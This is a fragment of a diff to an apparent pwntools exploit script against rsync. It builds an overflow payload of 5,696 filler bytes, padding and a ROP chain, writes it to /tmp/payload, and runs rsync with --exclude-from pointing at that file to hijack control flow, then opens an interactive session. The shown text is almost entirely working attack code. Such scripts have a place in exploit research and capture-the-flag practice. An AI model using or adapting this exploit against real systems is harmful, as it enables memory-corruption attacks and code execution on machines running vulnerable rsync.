@@ -63,8 +63,8 @@ rop = (
 )
 
 payload = ("A" * 5696) + "J"*8 + rop
+with open("/tmp/payload", "w") as f: f.write(payload)
 
-print "Starting rsync with the exploit payload"
 filename = './rsync'
 p = process(argv = [filename, '-r', '--exclude-from=/tmp/payload', '.', '/tmp/to/'], executable = filename)
 p.interactive()
